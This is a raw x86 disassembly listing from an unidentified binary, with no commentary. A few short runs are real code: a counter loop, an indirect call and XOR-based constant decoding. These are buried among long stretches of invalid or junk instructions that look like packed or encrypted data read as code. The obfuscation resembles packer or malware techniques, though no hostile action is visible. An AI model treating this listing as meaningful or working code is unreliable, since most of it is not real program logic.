  410925:	and    al,0x2a
  410927:	fnstcw WORD PTR [eax-0x6876c984]
  41092d:	push   0x41
  41092f:	push   esi
  410930:	push   edx
  410931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410932:	mov    bl,0x7d
  410934:	(bad)  
  410935:	jg     0x4108c3
  410937:	ficom  WORD PTR [ebx+eax*4-0x3c]
  41093b:	adc    eax,0x81581207
  410940:	cs nop
  410942:	sti    
  410943:	leave  
  410944:	ror    DWORD PTR [edx+0x74ecb924],cl
  41094a:	push   0xffffff8b
  41094c:	add    eax,0xcd028071
  410951:	test   BYTE PTR [ebp+ebx*4+0xa],dh
  410955:	and    DWORD PTR es:0x39c1037a,eax
  41095c:	inc    esi
  41095d:	push   esp
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x43446f,0x0
  41099b:	mov    eax,ds:0x43446f
  4109a0:	inc    eax
  4109a1:	mov    ds:0x43446f,eax
  4109a6:	cmp    DWORD PTR ds:0x43446f,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x43446f,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x43446f
  4109db:	inc    eax
  4109dc:	mov    ds:0x43446f,eax
  4109e1:	cmp    DWORD PTR ds:0x43446f,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x43454f
  4109f5:	adc    DWORD PTR ds:0x434463,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x43453b,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434487,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	fld    TBYTE PTR [esi+0x9]
  410a30:	jbe    0x4109dc
  410a32:	inc    edx
  410a33:	jle    0x410ab3
  410a35:	popf   
  410a36:	js     0x410ab6
  410a38:	jle    0x410a58
  410a3a:	mov    ecx,0x9de0eb53
  410a3f:	(bad)  
  410a40:	icebp  
  410a41:	clc    
  410a42:	std    
  410a43:	neg    edx
  410a45:	cmc    
  410a46:	(bad)  
  410a47:	(bad)  
  410a48:	push   ebx
  410a49:	cmp    bh,BYTE PTR [ecx]
  410a4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a4c:	dec    esi
  410a4d:	pop    esp
  410a4e:	ins    DWORD PTR es:[edi],dx
  410a4f:	bound  esi,QWORD PTR [edi]
  410a51:	pop    ebp
  410a52:	xchg   ebp,eax
  410a53:	fdiv   QWORD PTR [ebp+0x290e0e3c]
  410a59:	and    DWORD PTR [eax],ebp
  410a5b:	mov    sp,0xcc2e
  410a5f:	loopne 0x410aaf
  410a61:	xor    al,0xfe
  410a63:	ja     0x410a85
  410a65:	xchg   edx,eax
  410a66:	addr16 cmp DWORD PTR [di+0x4f],esi
  410a6b:	mov    edi,0xc31c0f5d
  410a70:	push   ebp
  410a71:	xlat   BYTE PTR ds:[ebx]
  410a72:	inc    esp
  410a73:	cmp    eax,0x1c32ee26
  410a78:	lahf   
  410a79:	imul   ebx,esp,0xffffffb0
  410a7c:	sub    ch,BYTE PTR [esp+ebx*2]
  410a7f:	(bad)  
  410a80:	int3   
  410a81:	sbb    bl,bl
  410a83:	(bad)  
  410a85:	or     edi,DWORD PTR [eax+0x6df4dc87]
  410a8b:	dec    ebx
  410a8c:	fnstenv [ecx]
  410a8e:	mov    ds:0x8e68339e,eax
  410a93:	jbe    0x410a99
  410a95:	pop    edi
  410a96:	push   esp
  410a97:	jbe    0x410a24
  410a99:	mov    eax,ds:0xf9151594
  410a9e:	cmp    BYTE PTR [eax+0x4644807],dl
  410aa4:	sbb    dh,BYTE PTR [edx-0x2aca6f5a]
  410aaa:	sub    DWORD PTR [esi],ebp
  410aac:	mov    bh,0xd4
  410aae:	fild   DWORD PTR ds:0x9e9eb475
  410ab4:	frstor [ebp+0x7c]
  410ab7:	popa   
  410ab8:	fcmovb st,st(5)
  410aba:	test   eax,0xc7ee3714
  410ac0:	xor    ebx,DWORD PTR [esi+0x47]
  410ac3:	mov    BYTE PTR ds:0xf5dde4c1,dl
  410aca:	and    al,0x70
  410acc:	mov    ebx,0xe850a603
  410ad1:	rcr    BYTE PTR [ebx+0x7d7f953],1
  410ad7:	hlt    
  410ad8:	sbb    eax,0xd0884187
  410add:	stc    
  410ade:	fisttp DWORD PTR [eax]
  410ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ae1:	push   edx
  410ae2:	push   ecx
  410ae3:	mov    ds:0x2fec36ec,al
  410ae8:	fucom  st(5)
  410aea:	jns    0x410ad3
  410aec:	adc    BYTE PTR [eax+0x32],dh
  410aef:	jne    0x410aab
  410af1:	std    
  410af2:	sub    al,0xdc
  410af4:	fidiv  WORD PTR [esi+0x2b]
  410af7:	dec    esp
  410af8:	adc    eax,0x2cab06d0
  410afd:	dec    ebp
  410afe:	shl    BYTE PTR [ebx+ebx*2-0x51],0xda
  410b03:	sbb    edi,DWORD PTR [eax+0x3f]
  410b06:	dec    ebx
  410b07:	pop    edx
  410b08:	stos   BYTE PTR es:[edi],al
  410b09:	sub    ebp,DWORD PTR [ebp-0x2f6cb0c1]
  410b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b10:	out    dx,eax
  410b11:	jns    0x410b26
  410b13:	push   ss
  410b14:	ins    DWORD PTR es:[edi],dx
  410b15:	cmp    bl,BYTE PTR [ebx+0x68]
  410b18:	call   DWORD PTR ds:0x8eaa2020
  410b1e:	inc    esi
  410b1f:	cli    
  410b20:	mov    ecx,esp
  410b22:	pop    ss
  410b23:	xor    eax,0x5ae754a6
  410b28:	xor    DWORD PTR ds:0xb440c00,edi
  410b2e:	dec    edi
  410b2f:	imul   esp,DWORD PTR [ebx],0xfffffff1
  410b32:	mov    eax,0x4d9d6b41
  410b37:	out    0xd0,al
  410b39:	fist   DWORD PTR gs:[eax+0x14]
  410b3d:	enter  0x9d90,0x41
  410b41:	dec    edi
  410b42:	add    BYTE PTR gs:[edi-0x11],bl
  410b46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b47:	aaa    
  410b48:	idiv   DWORD PTR [esi-0x72]
  410b4b:	jbe    0x410b1a
  410b4d:	mov    ds:0x11b9cf2f,eax
  410b52:	loope  0x410bb8
  410b54:	and    BYTE PTR ds:0xf91f770a,0x42
  410b5b:	add    bl,BYTE PTR [esi]
  410b5d:	mov    edx,0x785e3ed8
  410b62:	sub    BYTE PTR [ebp-0x4b],cl
  410b65:	adc    BYTE PTR [eax],0x16
  410b68:	xchg   ebx,eax
  410b69:	cmp    bh,BYTE PTR [eax+0xd66e2e2]
  410b6f:	pushf  
  410b70:	xchg   ebp,eax
  410b71:	sub    ch,BYTE PTR [eax+0x40]
  410b74:	push   es
  410b75:	bound  esi,QWORD PTR [ebp-0x20]
  410b78:	push   ds
  410b79:	data16 push bp
  410b7c:	dec    ecx
  410b7d:	leave  
  410b7e:	les    ebp,FWORD PTR [eax]
  410b80:	jbe    0x410b9c
  410b82:	or     eax,0xd21edea4
  410b87:	pop    esi
  410b88:	sbb    DWORD PTR [edx-0x48bfcbef],ebx
  410b8e:	mov    edi,0x2bd3e0be
  410b93:	xor    bh,BYTE PTR [ebx]
  410b95:	js     0x410b92
  410b97:	out    dx,eax
  410b98:	mov    ebx,0x69130bf1
  410b9d:	stos   DWORD PTR es:[edi],eax
  410b9e:	es inc esp
  410ba0:	mov    ebp,0xd48a535b
  410ba5:	jb     0x410b73
  410ba7:	jno    0x410b69
  410ba9:	addr16 je 0x410ba5
  410bac:	(bad)  
  410bae:	fs popf 
  410bb0:	les    ecx,FWORD PTR [esi-0x10]
  410bb3:	add    dl,BYTE PTR [esi]
  410bb5:	shl    BYTE PTR [ebp+0x63f186d2],0xca
  410bbc:	test   DWORD PTR ds:0x9f0aa5e0,ebp
  410bc2:	into   
  410bc3:	xor    al,bh
  410bc5:	(bad)  
  410bc7:	jmp    0xcf049ef4
  410bcc:	cmc    
  410bcd:	dec    eax
  410bce:	cdq    
  410bcf:	jno    0x410b94
  410bd1:	and    al,BYTE PTR [ecx-0x376d720c]
  410bd7:	nop
  410bd8:	int3   
  410bd9:	fistp  DWORD PTR [eax+0x8073401]
  410bdf:	adc    DWORD PTR [ebx+0x6637a7dc],edi
  410be5:	pop    ebx
  410be6:	pushf  
  410be7:	dec    esp
  410be8:	nop
  410be9:	push   eax
  410bea:	or     BYTE PTR [ecx-0x397f5da5],bh
  410bf0:	std    
  410bf1:	cld    
  410bf2:	fimul  WORD PTR [esi]
  410bf4:	ror    DWORD PTR [edx],1
  410bf6:	push   ds
  410bf7:	mul    BYTE PTR [esp+edx*4+0x4ae37c57]
  410bfe:	mul    ebp
  410c00:	adc    al,0x9e
  410c02:	ins    DWORD PTR es:[edi],dx
  410c03:	or     dl,BYTE PTR [ebp+0x3a]
  410c06:	and    DWORD PTR [ebx-0x127feefb],ecx
  410c0c:	ret    0xe24f
  410c0f:	aam    0xdb
  410c11:	gs repnz rcr esi,0x9c
  410c16:	enter  0x5601,0x27
  410c1a:	cmp    ecx,DWORD PTR [edx+0x4c]
  410c1d:	hlt    
  410c1e:	repnz add BYTE PTR [ebx+ecx*8+0x36],dl
  410c23:	rol    esi,1
  410c25:	sub    dh,dh
  410c27:	push   esi
  410c28:	and    dl,BYTE PTR [eax+0x3c693adb]
  410c2e:	outs   dx,BYTE PTR ds:[esi]
  410c2f:	push   es
  410c30:	pop    esp
  410c31:	xchg   al,cl
  410c33:	lods   eax,DWORD PTR ds:[esi]
  410c34:	les    ecx,FWORD PTR [edx-0x44467b2a]
  410c3a:	mov    al,0xbc
  410c3c:	cli    
  410c3d:	sub    al,0x72
  410c3f:	cmp    eax,0x9f610fa8
  410c44:	cld    
  410c45:	mov    ebp,DWORD PTR [eax-0x60bdf20]
  410c4b:	pop    edx
  410c4c:	mov    ds:0xb43fa7da,eax
  410c51:	paddd  mm3,QWORD PTR [eax]
  410c54:	sub    BYTE PTR [edx-0x2b6ec431],0xb0
  410c5b:	ret    
  410c5c:	(bad)  
  410c5e:	fcomp  st(6)
  410c60:	jo     0x410c73
  410c62:	daa    
  410c63:	stos   DWORD PTR es:[edi],eax
  410c64:	or     eax,0x5190cdc7
  410c69:	aas    
  410c6a:	jae    0x410cac
  410c6c:	fadd   DWORD PTR [ebx+0x3bf93174]
  410c72:	sub    DWORD PTR [eax+0x31705bec],esp
  410c78:	fwait
  410c79:	popa   
  410c7a:	enter  0x9db9,0x52
  410c7e:	xchg   BYTE PTR [esi],bl
  410c80:	mov    ebp,0xa65c34e1
  410c85:	inc    eax
  410c86:	aad    0x1a
  410c88:	sahf   
  410c89:	daa    
  410c8a:	retf   
  410c8b:	cli    
  410c8c:	push   es
  410c8d:	jl     0x410c69
  410c8f:	fimul  WORD PTR es:[esi-0x9]
  410c93:	test   DWORD PTR [edi+0xd],ecx
  410c96:	and    edi,esi
  410c98:	scas   al,BYTE PTR es:[edi]
  410c99:	sahf   
  410c9a:	jge    0x410c1d
  410c9c:	in     al,0x99
  410c9e:	mul    BYTE PTR [ecx+0x24]
  410ca1:	mov    ds:0x246b0b8e,al
  410ca6:	jb     0x410cea
  410ca8:	fidiv  DWORD PTR [ecx-0x5]
  410cab:	add    ecx,edi
  410cad:	retf   0x72d4
  410cb0:	cmp    dl,BYTE PTR [ebx+ebp*1]
  410cb3:	pop    ss
  410cb4:	(bad)  
  410cb5:	test   eax,0x8205e4dd
  410cba:	pop    ecx
  410cbb:	mov    bh,0x36
  410cbd:	pop    ss
  410cbe:	fs mov bh,0x77
  410cc1:	jns    0x410c9d
  410cc3:	icebp  
  410cc4:	out    dx,eax
  410cc5:	out    0xfe,al
  410cc7:	fst    QWORD PTR [ebp+0x7c]
  410cca:	push   edx
  410ccb:	xchg   ecx,eax
  410ccc:	or     al,0x92
  410cce:	dec    ebx
  410ccf:	add    dl,BYTE PTR [edi-0x10]
  410cd2:	sbb    DWORD PTR [esi-0x2aed1ec5],ebp
  410cd8:	mov    DWORD PTR [ebp+0x10],ecx
  410cdb:	mov    ecx,DWORD PTR ds:0x434547
  410ce1:	mov    DWORD PTR [ebp+0x8],0xf34ceba
  410ce8:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  410cef:	mov    ecx,DWORD PTR ds:0x434463
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43458b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434593,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x434547,0x434503
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434587,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43450f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx-0x3d584a99],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410d8b
  410d7a:	sbb    bl,ah
  410d7c:	fsubr  st(6),st
  410d7e:	jne    0x410d45
  410d80:	mov    DWORD PTR [eax-0x4],ebp
  410d83:	add    ah,BYTE PTR [edi]
  410d85:	out    0xad,eax
  410d87:	jl     0x410d2e
  410d89:	xchg   edi,eax
  410d8a:	inc    esi
  410d8b:	jmp    0xcbd1:0x6d0f788b
  410d92:	sbb    BYTE PTR [ecx+0x7bd1c1ba],al
  410d98:	popa   
  410d99:	xor    BYTE PTR [edi-0x40],ch
  410d9c:	inc    esp
  410d9d:	hlt    
  410d9e:	inc    eax
  410d9f:	push   ss
  410da0:	push   esp
  410da1:	arpl   sp,cx
  410da3:	push   ecx
  410da4:	(bad)  
  410da5:	fmul   QWORD PTR [edi+0x57]
  410da8:	xchg   edi,eax
  410da9:	repz inc esi
  410dab:	xor    ah,BYTE PTR ds:0x829ad2a8
  410db1:	xor    dh,BYTE PTR [esp+ebx*4+0x58d1f859]
  410db8:	sbb    BYTE PTR [edi+0x280cbd67],0x3
  410dbf:	and    esi,ecx
  410dc1:	bound  esp,QWORD PTR [ebp-0x34]
  410dc4:	fucomip st,st(6)
  410dc6:	sub    ebp,edx
  410dc8:	retf   
  410dc9:	or     ebx,DWORD PTR [eax-0x68]
  410dcc:	jecxz  0x410e17
  410dce:	(bad)  
  410dcf:	jns    0x410d6f
  410dd1:	fiadd  DWORD PTR [esi-0x78]
  410dd4:	mov    dh,0xd5
  410dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd7:	cmp    bl,BYTE PTR [eax+0x159a4f80]
  410ddd:	xchg   DWORD PTR [eax+0x7a],esp
  410de0:	mov    eax,0x72e0e61a
  410de5:	or     eax,0xb2ba7dd5
  410dea:	inc    esi
  410deb:	enter  0x95d7,0xb9
  410def:	out    0x10,al
  410df1:	call   0xe007:0xc0a749c
  410df8:	pop    ecx
  410df9:	push   ebp
  410dfa:	cmp    DWORD PTR [eax-0x5c],0xffffffed
  410dfe:	and    al,BYTE PTR [esi-0x1e]
  410e01:	fdiv   QWORD PTR [edi+0x5518d707]
  410e07:	push   ds
  410e08:	loope  0x410d95
  410e0a:	cwde   
  410e0b:	popa   
  410e0c:	lods   al,BYTE PTR ds:[esi]
  410e0d:	(bad)  
  410e0e:	dec    edi
  410e0f:	jge    0x410e05
  410e11:	sbb    BYTE PTR [eax],cl
  410e13:	test   al,0x41
  410e15:	int3   
  410e16:	dec    edx
  410e17:	repz retf 0xc16b
  410e1b:	call   0x6197:0x198895db
  410e22:	push   ecx
  410e23:	clc    
  410e24:	fwait
  410e25:	sub    ah,BYTE PTR [ebx-0x10cb528d]
  410e2b:	sub    DWORD PTR [edi-0x2063e2f5],edi
  410e31:	std    
  410e32:	cmp    al,0xf6
  410e34:	sbb    eax,0xd22e3ada
  410e39:	lods   al,BYTE PTR ds:[esi]
  410e3a:	xor    eax,0xd0893b83
  410e3f:	dec    esi
  410e40:	xchg   esp,eax
  410e41:	sar    BYTE PTR [edi],0x4b
  410e44:	jno    0x410e1e
  410e46:	repnz cld 
  410e48:	push   eax
  410e49:	aas    
  410e4a:	call   0xfeaa:0xb855f73d
  410e51:	fcmove st,st(6)
  410e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e54:	ret    0x2f98
  410e57:	ja     0x410ea2
  410e59:	pop    ss
  410e5a:	dec    ebx
  410e5b:	cmp    BYTE PTR [ecx-0x5103fc73],bl
  410e61:	jb     0x410df3
  410e63:	sbb    DWORD PTR [esi],0xa5fe4aa8
  410e69:	xor    ch,bh
  410e6b:	jge    0x410e92
  410e6d:	xchg   BYTE PTR [eax-0x61cc8c39],ch
  410e73:	jne    0x410e8e
  410e75:	xchg   ecx,eax
  410e76:	stos   DWORD PTR es:[edi],eax
  410e77:	lahf   
  410e78:	push   ebx
  410e79:	icebp  
  410e7a:	out    dx,eax
  410e7b:	js     0x410eae
  410e7d:	ret    
  410e7e:	fldenv [edi]
  410e80:	cmp    BYTE PTR [eax+0x1d55c613],ch
  410e86:	jb     0x410e38
  410e88:	push   cs
  410e89:	loop   0x410ee8
  410e8b:	add    esi,DWORD PTR [edi-0x6a5e101d]
  410e91:	mov    BYTE PTR [edx-0x3b],0x54
  410e95:	pop    eax
  410e96:	inc    esp
  410e97:	mov    ch,dh
  410e99:	inc    ebx
  410e9a:	leave  
  410e9b:	adc    ebx,ebx
  410e9d:	sahf   
  410e9e:	mov    ebp,0x43f31aad
  410ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ea4:	add    ch,BYTE PTR ds:0xadf5dc80
  410eaa:	jns    0x410ea3
  410eac:	inc    edi
  410ead:	retf   0xc58c
  410eb0:	int    0xe3
  410eb2:	pop    eax
  410eb3:	mov    al,ds:0xe29d3505
  410eb8:	or     al,0xa4
  410eba:	fisub  DWORD PTR [eax]
  410ebc:	retf   
  410ebd:	xchg   ebp,eax
  410ebe:	stc    
  410ebf:	push   eax
  410ec0:	out    0x9d,eax
  410ec2:	dec    esi
  410ec3:	pop    es
  410ec4:	mov    ebx,0xdf286044
  410ec9:	or     ebp,eax
  410ecb:	and    DWORD PTR ds:0x3ad4ea78,edx
  410ed1:	sbb    al,BYTE PTR [ebp+0x38b273e9]
  410ed7:	sbb    dh,0x7c
  410eda:	mov    al,0x57
  410edc:	pusha  
  410edd:	inc    ebx
  410ede:	mov    WORD PTR [eax],?
  410ee0:	test   BYTE PTR [edx],bh
  410ee2:	fist   DWORD PTR [ecx]
  410ee4:	lock aaa 
  410ee6:	inc    ebp
  410ee7:	xchg   ecx,eax
  410ee8:	xchg   esp,eax
  410ee9:	dec    edi
  410eea:	pusha  
  410eeb:	dec    esi
  410eec:	stos   DWORD PTR es:[edi],eax
  410eed:	xchg   ecx,eax
  410eee:	and    ch,BYTE PTR [esi+0x7dd94562]
  410ef4:	or     ah,BYTE PTR [edx+0x48d2e941]
  410efa:	jmp    0x2641:0x70f2d463
  410f01:	(bad)  
  410f02:	out    0x71,eax
  410f04:	leave  
  410f05:	inc    eax
  410f06:	adc    DWORD PTR [ebx+0x34],0xffffffee
  410f0a:	frstor [ecx+0x29f2a79c]
  410f10:	cmp    eax,0x60da7009
  410f15:	(bad)  
  410f16:	loope  0x410f69
  410f18:	lea    esp,[edi]
  410f1a:	je     0x410f19
  410f1c:	push   es
  410f1d:	push   ds
  410f1e:	jecxz  0x410ed1
  410f20:	push   esp
  410f21:	loope  0x410f4d
  410f23:	jmp    0x410f04
  410f25:	pop    ecx
  410f26:	and    eax,0xbf4499e4
  410f2b:	adc    ecx,ebx
  410f2d:	mov    eax,cs:0x18908b2d
  410f33:	push   esi
  410f34:	out    dx,eax
  410f35:	(bad)  
  410f36:	(bad)  
  410f38:	xchg   DWORD PTR [eax],edi
  410f3a:	mov    al,ds:0x68521a60
  410f3f:	mov    ch,0xc7
  410f41:	cmp    ebp,eax
  410f43:	test   DWORD PTR [esi-0x43],esp
  410f46:	sar    DWORD PTR [ebx+0x10beab30],0xce
  410f4d:	ret    
  410f4e:	xor    ecx,DWORD PTR es:[edi]
  410f51:	cld    
  410f52:	in     al,0xc2
  410f54:	fisubr DWORD PTR [edi+0x43185ea1]
  410f5a:	sub    eax,0xd6c4577b
  410f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f60:	pop    es
  410f61:	aaa    
  410f62:	pop    es
  410f63:	aas    
  410f64:	push   ebx
  410f65:	scas   eax,DWORD PTR es:[edi]
  410f66:	hlt    
  410f67:	(bad)  
  410f68:	sub    esp,esp
  410f6a:	ins    DWORD PTR es:[edi],dx
  410f6b:	cmp    DWORD PTR [edx],edi
  410f6d:	test   eax,0xc68cc7d7
  410f72:	xchg   ebx,eax
  410f73:	aad    0xa0
  410f75:	hlt    
  410f76:	fstp   QWORD PTR [edi]
  410f78:	ins    DWORD PTR es:[edi],dx
  410f79:	rcr    DWORD PTR [ebp+0x57],1
  410f7c:	adc    bh,bh
  410f7e:	dec    edi
  410f7f:	add    eax,0xa1be9577
  410f84:	and    eax,0x47bd7e65
  410f89:	fist   WORD PTR [eax+eax*4]
  410f8c:	mov    edi,0xf06e702b
  410f91:	popf   
  410f92:	rol    DWORD PTR ds:0xd18088c9,cl
  410f98:	imul   esi,DWORD PTR [ecx],0x6b
  410f9b:	stos   DWORD PTR es:[edi],eax
  410f9c:	addr16 push ebp
  410f9e:	frstor [edx+0x5613381d]
  410fa4:	mov    ebp,DWORD PTR [eax+edx*2]
  410fa7:	sub    BYTE PTR [ecx+0x15cbfaa3],ah
  410fad:	adc    al,0x9
  410faf:	(bad)  
  410fb0:	fadd   QWORD PTR [esi-0x501f7fb5]
  410fb6:	mov    edi,DWORD PTR [esi+0x7d]
  410fb9:	xchg   edx,eax
  410fba:	xor    cl,BYTE PTR ds:0x2c11cbf4
  410fc0:	mov    BYTE PTR [esi+edx*4],al
  410fc3:	xchg   ebp,eax
  410fc4:	dec    ecx
  410fc5:	fscale 
  410fc7:	fsubr  DWORD PTR [ebx+0x18]
  410fca:	dec    DWORD PTR [eax-0xb]
  410fcd:	push   esi
  410fce:	xchg   esp,eax
  410fcf:	int3   
  410fd0:	jbe    0x410f9c
  410fd2:	scas   al,BYTE PTR es:[edi]
  410fd3:	add    dl,BYTE PTR [edx+0x76db393d]
  410fd9:	(bad)  [ebp-0x18]
  410fdc:	in     al,dx
  410fdd:	and    ah,bl
  410fdf:	lods   al,BYTE PTR ds:[esi]
  410fe0:	fnstcw WORD PTR [esi-0x3e]
  410fe3:	mov    eax,ds:0xcba6ec48
  410fe8:	fidiv  DWORD PTR [ebx]
  410fea:	arpl   WORD PTR [ecx+0x7176e9fb],ax
  410ff0:	mov    gs,WORD PTR [ebx]
  410ff2:	loop   0x411052
  410ff4:	add    bh,al
  410ff6:	adc    DWORD PTR [edx+0x2f70dc34],ebp
  410ffc:	push   ebx
  410ffd:	xor    edx,DWORD PTR [edx-0x45]
  411000:	outs   dx,BYTE PTR ds:[esi]
  411001:	and    eax,0x3bd3b3e1
  411006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411007:	cld    
  411008:	mov    ebx,0x841d0ac8
  41100d:	jb     0x410ffb
  41100f:	cmc    
  411010:	mov    cl,0xb0
  411012:	call   0x812e:0x1b231cff
  411019:	shl    DWORD PTR [edi-0x73],0xcd
  41101d:	dec    DWORD PTR [ebx+0x3f033f1]
  411023:	jne    0x41102d
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0x37694754
  411040:	mov    esp,0x7e4f68f3
  411045:	jle    0x410fe4
  411047:	js     0x4110c7
  411049:	jle    0x411080
  41104b:	test   ecx,esp
  41104d:	or     ebp,DWORD PTR [esi+0x22daf9cf]
  411053:	pop    ss
  411054:	sti    
  411055:	out    0x8c,al
  411057:	in     al,0x27
  411059:	sub    al,cl
  41105b:	adc    DWORD PTR [ecx+0x31],esp
  41105e:	xor    DWORD PTR [edx+0x3f],eax
  411061:	retf   0x1434
  411064:	aad    0xb5
  411066:	lods   al,BYTE PTR ds:[esi]
  411067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411068:	dec    edx
  411069:	pop    ebx
  41106a:	and    al,0x83
  41106c:	out    0xba,eax
  41106e:	stc    
  41106f:	jg     0x4110b6
  411071:	sbb    al,0xd
  411073:	pop    esi
  411074:	dec    ebp
  411075:	repnz dec ebx
  411077:	fst    DWORD PTR [ecx+0x14]
  41107a:	daa    
  41107b:	cmp    BYTE PTR [edi],0x2e
  41107e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41107f:	and    DWORD PTR [ecx],eax
  411081:	pop    ebp
  411082:	shl    bl,0x88
  411085:	fwait
  411086:	jmp    0xa836dfbc
  41108b:	push   0x4f6c67b1
  411090:	pop    esp
  411091:	out    0x90,al
  411093:	jno    0x411036
  411095:	stos   BYTE PTR es:[edi],al
  411096:	mov    DWORD PTR [esi-0x38],ebx
  411099:	inc    ebp
  41109a:	adc    BYTE PTR [ecx-0x4],cl
  41109d:	or     DWORD PTR [edi],ebx
  41109f:	test   al,0x40
  4110a1:	sbb    eax,0xa8bf7438
  4110a6:	push   ecx
  4110a7:	pop    esi
  4110a8:	push   edi
  4110a9:	adc    al,0x5b
  4110ab:	mov    eax,0x8674fe3f
  4110b0:	xor    BYTE PTR [edx],bl
  4110b2:	xor    DWORD PTR es:[edx-0x75e02a34],eax
  4110b9:	inc    ecx
  4110ba:	mov    ch,0x1a
  4110bc:	sub    DWORD PTR [ebp-0x558e8a1c],ebx
  4110c2:	mov    ebp,0x57c74c7f
  4110c7:	inc    edx
  4110c8:	inc    esi
  4110c9:	sbb    DWORD PTR [edx+0x112755c8],eax
  4110cf:	jle    0x411062
  4110d1:	dec    edi
  4110d2:	adc    eax,DWORD PTR [ecx-0x2059e251]
  4110d8:	push   cs
  4110d9:	lahf   
  4110da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110db:	push   0xffffff87
  4110dd:	cmp    esi,edi
  4110df:	scas   eax,DWORD PTR es:[edi]
  4110e0:	pop    ss
  4110e1:	popa   
  4110e2:	inc    esp
  4110e3:	push   ds
  4110e4:	nop
  4110e5:	pop    ds
  4110e6:	fidiv  WORD PTR [edx+edx*4-0x4587a250]
  4110ed:	mov    al,ds:0xc198f531
  4110f2:	inc    edx
  4110f3:	push   ebp
  4110f4:	xor    BYTE PTR [eax-0x10],cl
  4110f7:	rcpps  xmm1,xmm5
  4110fa:	jae    0x4110d9
  4110fc:	fistp  DWORD PTR [ebp-0x4c35c6b]
  411102:	out    dx,eax
  411103:	jae    0x4110bb
  411105:	cmp    al,0x26
  411107:	and    BYTE PTR [edi+0x64db9d7],bl
  41110d:	adc    al,0xcf
  41110f:	sar    al,cl
  411111:	push   edi
  411112:	test   DWORD PTR [esi+0xc],ecx
  411115:	sub    DWORD PTR [ebx+0x5afde2c0],ebp
  41111b:	add    al,0x31
  41111d:	cdq    
  41111e:	jp     0x411105
  411120:	popf   
  411121:	add    bh,BYTE PTR [ebp+0x1b]
  411124:	xor    al,0xdc
  411126:	inc    edi
  411127:	inc    esi
  411128:	push   esi
  411129:	icebp  
  41112a:	dec    ecx
  41112b:	int3   
  41112c:	pusha  
  41112d:	sub    ebx,DWORD PTR [edi+ecx*1-0x4a]
  411131:	jmp    0x4110ed
  411133:	test   DWORD PTR [ebp-0x5c95b90e],0x1a8d9e70
  41113d:	jo     0x4110e6
  41113f:	jmp    0x41111d
  411141:	iret   
  411142:	mov    ds:0x7d44d982,eax
  411147:	aam    0xdf
  411149:	lds    eax,FWORD PTR [ecx-0x51028320]
  41114f:	ja     0x4111b6
  411151:	mov    ecx,0x6f6bd8d9
  411156:	clc    
  411157:	cmp    edx,DWORD PTR [edx+0x3f0ea122]
  41115d:	inc    eax
  41115e:	pop    es
